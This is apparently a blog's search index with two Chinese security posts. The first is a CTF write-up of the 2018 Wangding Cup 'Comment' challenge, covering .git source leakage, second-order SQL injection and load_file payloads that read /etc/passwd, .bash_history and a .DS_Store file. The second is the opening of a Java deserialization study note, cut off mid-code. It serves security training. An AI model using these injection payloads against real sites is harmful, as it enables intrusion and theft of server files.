<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>记录一道很有意思的.git泄露题目</title>
    <link href="/2023/12/31/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84.git%E6%B3%84%E9%9C%B2%E9%A2%98%E7%9B%AE/"/>
    <url>/2023/12/31/%E8%AE%B0%E5%BD%95%E4%B8%80%E9%81%93%E5%BE%88%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84.git%E6%B3%84%E9%9C%B2%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<p>思路很新奇，单独从做题记录里拿出来写一下</p><span id="more"></span><hr><h2 id="网鼎杯-2018-Comment"><a href="#网鼎杯-2018-Comment" class="headerlink" title="[网鼎杯 2018]Comment"></a>[网鼎杯 2018]Comment</h2><p><img src="/img/wdb2018comment1.png" alt="wdb2018comment1"></p><p>没找到啥提示，<code>dirsearch</code>能扫出<code>.git</code>文件，直接访问发现<code>Forbidden</code></p><p><code>dirsearch -u http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/ --delay 3 -t 30</code></p><p><img src="/img/wdb2018comment3.png" alt="wdb2018comment3"></p><p><code>Githack</code>弄它：</p><p><code>python Githack.py -u http://dd49341c-8374-4a4a-91ac-b258826c8af5.node4.buuoj.cn:81/.git/</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write_do.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>到这里不会做了。。感觉这个文件没有啥可用的信息？</p><p>我一开始以为<code>$_SESSION[&#39;login&#39;]</code>这里会有利用点。后面看了<code>wp</code>才知道这东西不全。。</p><p><code>Kali</code>下：</p><p><code>python2 GitHack.py http://27a5f1ac-984c-46a1-9c73-0fc68067d28c.node4.buuoj.cn:81/.git</code></p><p>然后进对应文件夹看所有分支提交历史：</p><p><img src="/img/wdb2018comment4.png" alt="wdb2018comment4"></p><p><code>git reset --hard  e5b2a2443c2b6d395d06960123142bc91123148c</code></p><p><img src="/img/wdb2018comment5.png" alt="wdb2018comment5"></p><p>再看<code>write_do.php</code>：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><span class="hljs-title function_ invoke__">session_start</span>();<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br><span class="hljs-keyword">switch</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>&#123;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;write&#x27;</span>:<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;comment&#x27;</span>:<br>    <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    <span class="hljs-variable">$num</span> = <span class="hljs-title function_ invoke__">mysql_num_rows</span>(<span class="hljs-variable">$result</span>);<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>    <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-subst">$bo_id</span>&quot;</span>);<br>    <span class="hljs-keyword">break</span>;<br><span class="hljs-keyword">default</span>:<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>&#125;<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br></code></pre></td></tr></table></figure><p>这个地方好像没啥可以利用的地方。。</p><p>没给<code>register</code>界面，不过他提示了用户名和密码的一部分，<code>zhangwei``zhangwei***</code>，后面三位抓包爆破就行：<code>zhangwei666</code></p><p>注意这里：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>   <span class="hljs-variable">$title</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>   <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>   <span class="hljs-variable">$bo_id</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>只做了单纯的转义处理，很容易知道这里可能存在二次注入。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                title = &#x27;<span class="hljs-subst">$title</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;&quot;</span>;<br><span class="hljs-comment">//comment</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>   <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;<span class="hljs-subst">$category</span>&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p><code>$category</code>可以当注入点，抓包看下数据怎么传过去的：</p><p><img src="/img/wdb2018comment6.png" alt="wdb2018comment6"></p><p>CATEGORY字段：<code>test&#39;,content=database()#</code></p><p>这东西放进去就相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//write</span><br><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">            set category = &#x27;test\&#x27;,content=database()#&#x27;,</span><br><span class="hljs-string">                title = &#x27;2&#x27;,</span><br><span class="hljs-string">                content = &#x27;222&#x27;&quot;</span>;<br><span class="hljs-comment">//comment</span><br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br>   <span class="hljs-variable">$category</span> = <span class="hljs-title function_ invoke__">mysql_fetch_array</span>(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>    <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">            set category = &#x27;test&#x27;,content=database()#&#x27;,</span><br><span class="hljs-string">                content = &#x27;<span class="hljs-subst">$content</span>&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">mysql_query</span>(<span class="hljs-variable">$sql</span>);<br><br><br></code></pre></td></tr></table></figure><p>然后在<code>comment</code>下触发就行。</p><p>但奇怪的是我的<code>payload</code>并没有触发，<code>comment</code>提交后加载不出来。。</p><p>后面才知道对于这种多行的<code>sql</code>语句要用多行注释<code>(\**\)</code>。。</p><p>我当时理解的是:</p><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">$sql = &quot;<span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> comment<br>            <span class="hljs-keyword">set</span> category = <span class="hljs-string">&#x27;&#x27;</span>,content=<span class="hljs-keyword">database</span>()#<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                content = &#x27;</span>$content<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;</span>$bo_id<span class="hljs-string">&#x27;&quot;;</span><br></code></pre></td></tr></table></figure><p><code>database()#</code>里的这个<code>#</code>把后面所有内容全注释掉了，所以随便哪个<code>bo_id</code>中对应的内容都回显库名。</p><p>对于多行<code>sql</code>，举个栗子：</p><p><img src="/img/wdb2018comment7.png" alt="wdb2018comment7"></p><p>CATEGORY字段：<code>1&#39;,content=database(),/*</code></p><p>然后再<code>comment</code>时<code>content</code>字段改成：<code>*/#</code>，这样组合相当于：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">        set category = &#x27;1&#x27;,content=database(),/*&#x27;,</span><br><span class="hljs-string">            content = &#x27;*/#&#x27;,</span><br><span class="hljs-string">            bo_id = &#x27;<span class="hljs-subst">$bo_id</span>&#x27;&quot;</span>;<br></code></pre></td></tr></table></figure><p>第二行的<code>/*</code>与第三行的<code>*/</code>将中间注释，而第三行的<code>#</code>，将后面的<code>单引号</code>和<code>逗号</code>给注释了。</p><p><img src="/img/wdb2018comment9.png" alt="wdb2018comment9"></p><p>爆库：<code>test&#39;,content=(select(group_concat(schema_name))from(information_schema.schemata)),/*</code></p><p>爆表：<code>test&#39;,content=(select(group_concat(table_name))from(information_schema.tables)where((table_schema)=(database()))),/*</code></p><p><img src="/img/wdb2018comment16.png" alt="wdb2018comment16"></p><p>爆字段的时候会发现没有和<code>flag</code>有关的字段，看了<code>wp</code>发现这里要去看<code>user</code>这个东西：</p><figure class="highlight fix"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs fix"><span class="hljs-attr">1&#x27;,content</span>=<span class="hljs-string">user(),/*   //返回当前数据库连接的用户名</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment10.png" alt="wdb2018comment10"></p><blockquote><p> 说明flag不在数据库而在本地文件里，需要读取。在数据库中无需root权限。</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-operator">/</span>etc<span class="hljs-operator">/</span>passwd<span class="hljs-string">&#x27;)),/*</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment11.png" alt="wdb2018comment11"></p><p>注意最后一行，<code>www</code> 用户的 <code>home</code> 目录(第五个冒号后)一般都是<code> /var/www</code>, 而这里是<code> /home/www</code></p><p>我们可以想办法读取<code>www</code>用户的操作记录：</p><blockquote><p> .bash_history保存了当前用户使用过的历史命令</p></blockquote><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">&#x27;,content=((<span class="hljs-keyword">select</span>(load_file(<span class="hljs-string">&quot;/home/www/.bash_history&quot;</span>)))),/*<br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment13.png" alt="wdb2018comment13"></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk">cd <span class="hljs-regexp">/tmp/</span>：切换当前工作目录到<span class="hljs-regexp">/tmp/</span>目录<br>unzip html.zip：解压缩名为html.zip的文件<br>rm -f html.zip：强制删除名为html.zip的文件<br>cp -r html <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/：将名为html的目录递归地复制到/</span>var<span class="hljs-regexp">/www/</span>目录下<br>cd <span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>：切换当前工作目录到<span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>目录<br>rm -f .DS_Store：删除名为.DS_Store的文件<br>service apache2 start：启动Apache2服务<br></code></pre></td></tr></table></figure><p>删除了<code>/var/www/html/.DS_Store</code>，但没删<code>/tmp/html/.DS_Store</code>。</p><blockquote><p>.DS_Store是Mac OS保存文件夹的自定义属性的隐藏文件，如文件的图标位置或背景色，相当于Windows的desktop.ini。经常会有一些不可见的字符</p></blockquote><p>尝试读取：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;,content=(select load_file(&#x27;</span><span class="hljs-operator">/</span>tmp<span class="hljs-operator">/</span>html<span class="hljs-operator">/</span>.DS_Store<span class="hljs-string">&#x27;)),/*</span><br></code></pre></td></tr></table></figure><p><img src="/img/wdb2018comment14.png" alt="wdb2018comment14"></p><p>？？？看下源码：</p><p><img src="/img/wdb2018comment15.png" alt="wdb2018comment15"></p><p>一大堆乱码，可以尝试转换成十六进制读取，为啥么这么转在网上查了一下：</p><p><img src="/img/wdb2018comment17.png" alt="wdb2018comment17"></p><p><code>1&#39;,content=(select hex(load_file(&#39;/tmp/html/.DS_Store&#39;))),/*</code></p><p><img src="/img/wdb2018comment18.png" alt="wdb2018comment18"></p><p>全选之后解码，能发现有这么个东西：</p><p><img src="/img/wdb2018comment20.png" alt="wdb2018comment20"></p><p><code>1&#39;,content=(select hex(load_file(&#39;/var/www/html/flag_8946e1ff1ee3e40f.php&#39;))),/*</code></p><p><img src="/img/wdb2018comment21.png" alt="wdb2018comment21"></p><p>然后十六进制解码就行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;99773ebf-cc83-4cda-a092-a9e1a14af733&#125;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>当然也有专门读<code>DS_Store</code>这种文件的工具：<code>https://github.com/gehaxelt/Python-dsstore</code></p><p>用法也很简单：</p><p><img src="/img/wdbcomment30.png" alt="wdbcomment30"></p><p>注意这里我们获得十六进制数据后，先把十六进制文件(内容复制粘贴，<code>txt</code>)转换成二进制文件再操作才行：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">hex_file_to_binary</span>(<span class="hljs-params">hex_file_path, binary_file_path</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(hex_file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> hex_file:<br>        hex_string = hex_file.read().replace(<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>)<br>        binary_string = <span class="hljs-built_in">bytes</span>.fromhex(hex_string).decode(<span class="hljs-string">&#x27;latin-1&#x27;</span>)<br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(binary_file_path, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> binary_file:<br>        binary_file.write(binary_string.encode(<span class="hljs-string">&#x27;latin-1&#x27;</span>))<br><br><br>hex_file_path = <span class="hljs-string">&#x27;d:/hexwhat.txt&#x27;</span><br>binary_file_path = <span class="hljs-string">&#x27;d:/biwhat.txt&#x27;</span><br><br>hex_file_to_binary(hex_file_path, binary_file_path)<br></code></pre></td></tr></table></figure><p><img src="/img/wdbcomment99.png" alt="wdbcomment99"></p><p>后面步骤一样就不写了。</p>]]></content>
    
    
    
    <tags>
      
      <tag>CTF</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java安全学习笔记_反序列化_1</title>
    <link href="/2023/12/29/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2023/12/29/Java%E5%AE%89%E5%85%A8%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0_%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>学习笔记</p><span id="more"></span><hr><blockquote><p>最近开了个新坑：java安全，随便写点笔记</p></blockquote><h3 id="0x01-什么是序列化和反序列化？"><a href="#0x01-什么是序列化和反序列化？" class="headerlink" title="0x01 什么是序列化和反序列化？"></a>0x01 什么是序列化和反序列化？</h3><p>​简单说就是让数据以流的形式在网络上传输(比如两个对象之间)或者被存储介质存储。序列化将对象转换为字节流，反序列化将字节流转换为数据。比如：A给B打电话，我们需要把声音信号转换成电&#x2F;光等信号传输，然后收方再把电&#x2F;光信号等还原成声音信号。</p><p>​当对象被序列化时，它的状态被转换为字节流并保存起来。这意味着即使程序结束或关闭，对象的状态仍然可以被保留。当需要重新使用对象时，可以通过反序列化将字节流转换回对象，并恢复对象的状态。</p><p>​<code>Java</code> 中被创建的对象的声明周期一般不会比<code> JVM</code> 的运行周期更长，<code>JVM </code> 运行结束以后，其创建的对象也就消失了。但在某些情况下，我们想要达到一种效果，即即使<code>JVM</code> 结束运行了，我们还可以用到之前所创建的对象，或者说，我们想要将之前创建的对象保存下来，以便进行传输，更或者说，让之前<code>JVM </code>所创建的对象能够在另一个<code> JVM</code> 中运行。要达到这样的功能，就可以采用<code> Java</code> 中的序列化和反序列化机制。</p><p>​不光在<code>java</code>中，<code>php、python</code>均存在序列化和反序列化，下面举几个简单栗子。</p><h3 id="0x02-php-python-java中的序列化和反序列化"><a href="#0x02-php-python-java中的序列化和反序列化" class="headerlink" title="0x02 php, python, java中的序列化和反序列化"></a>0x02 php, python, java中的序列化和反序列化</h3><ul><li>PHP</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Notbad</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$gender</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-variable">$age</span>;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-string">&#x27;viper3&#x27;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;gender = <span class="hljs-string">&#x27;male&#x27;</span>;<br><span class="hljs-variable language_">$this</span>-&gt;age = <span class="hljs-string">&#x27;23&#x27;</span>;<br>&#125;<br>&#125;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Notbad</span>();<br><span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;br\&gt;&#x27;</span>;<br><span class="hljs-title function_ invoke__">var_dump</span> (<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>));<br><span class="hljs-meta">?&gt;</span><br>    <br><span class="hljs-comment">//O:6:&quot;Notbad&quot;:3:&#123;s:4:&quot;name&quot;;s:6:&quot;viper3&quot;;s:6:&quot;gender&quot;;s:4:&quot;male&quot;;s:3:&quot;age&quot;;s:2:&quot;23&quot;;&#125;</span><br>    <br><span class="hljs-comment">//object(Notbad)#2 (3) &#123;</span><br>  [<span class="hljs-string">&quot;name&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">6</span>) <span class="hljs-string">&quot;viper3&quot;</span><br>  [<span class="hljs-string">&quot;gender&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">4</span>) <span class="hljs-string">&quot;male&quot;</span><br>  [<span class="hljs-string">&quot;age&quot;</span>]=&gt;<br>  <span class="hljs-keyword">string</span>(<span class="hljs-number">2</span>) <span class="hljs-string">&quot;23&quot;</span><br>&#125;<br><br></code></pre></td></tr></table></figure><ul><li>python</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 